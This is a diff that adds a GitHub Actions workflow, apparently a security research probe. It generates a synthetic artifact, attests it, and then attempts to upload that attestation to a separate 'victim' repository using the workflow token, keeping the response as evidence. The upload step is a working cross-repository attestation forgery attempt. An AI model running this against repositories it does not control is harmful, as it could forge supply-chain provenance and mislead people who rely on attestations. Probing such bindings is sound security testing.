@@ -1,0 +1,84 @@
+name: Attacker control and cross-repository attestation probe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+  attestations: write
+
+jobs:
+  attest-and-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create synthetic attacker artifact
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          openssl rand -hex 64 > b-artifact.bin
+          sha256sum b-artifact.bin | awk '{print $1}' > b-artifact.sha256
+          printf 'Synthetic artifact SHA-256: `%s`\n' "$(cat b-artifact.sha256)" >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Generate legitimate attacker-repository attestation
+        id: attest
+        uses: actions/attest@v4
+        with:
+          subject-path: b-artifact.bin
+
+      - name: Attempt victim-path attestation upload with B runtime token
+        if: steps.attest.outcome == 'success'
+        shell: bash
+        env:
+          BUNDLE_PATH: ${{ steps.attest.outputs.bundle-path }}
+          GH_RUNTIME_TOKEN: ${{ github.token }}
+          TARGET_REPOSITORY: Per0x1de-1337/attestation-binding-victim-20261106215539
+        run: |
+          set -euo pipefail
+          jq -c '{bundle: .}' "$BUNDLE_PATH" > attack-request.json
+          status="$(curl -sS -o attack-response.json -w '%{http_code}' \
+            -X POST \
+            -H 'Accept: application/vnd.github+json' \
+            -H "Authorization: Bearer ${GH_RUNTIME_TOKEN}" \
+            -H 'X-GitHub-Api-Version: 2026-03-10' \
+            -H 'Content-Type: application/json' \
+            "https://api.github.com/repos/${TARGET_REPOSITORY}/attestations" \
+            --data-binary @attack-request.json)"
+          printf '%s\n' "$status" > attack-status.txt
+          jq -c '{message,status,documentation_url,errors,id}' attack-response.json > attack-response-sanitized.json 2>/dev/null || true
+          printf 'Cross-repository upload HTTP status: `%s`\n' "$status" >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Preserve redacted attestation evidence
+        if: always()
+        shell: bash
+        env:
+          BUNDLE_PATH: ${{ steps.attest.outputs.bundle-path }}
+        run: |
+          set -euo pipefail
+          if [[ -n "${BUNDLE_PATH:-}" && -f "$BUNDLE_PATH" ]]; then
+            cp "$BUNDLE_PATH" b-bundle.json
+            jq -r '.dsseEnvelope.payload' b-bundle.json | base64 -d > b-statement.json
+            jq -r '.verificationMaterial.certificate.rawBytes // empty' b-bundle.json | base64 -d > b-cert.der
+            if [[ -s b-cert.der ]]; then
+              openssl x509 -inform DER -in b-cert.der -noout -text > b-certificate.txt
+            fi
+            rm -f b-cert.der
+          fi
+          rm -f attack-request.json
+
+      - name: Upload probe evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: b-attestation-evidence-${{ github.run_id }}
+          if-no-files-found: ignore
+          retention-days: 7
+          path: |
+            b-artifact.bin
+            b-artifact.sha256
+            b-bundle.json
+            b-statement.json
+            b-certificate.txt
+            attack-status.txt
+            attack-response-sanitized.json
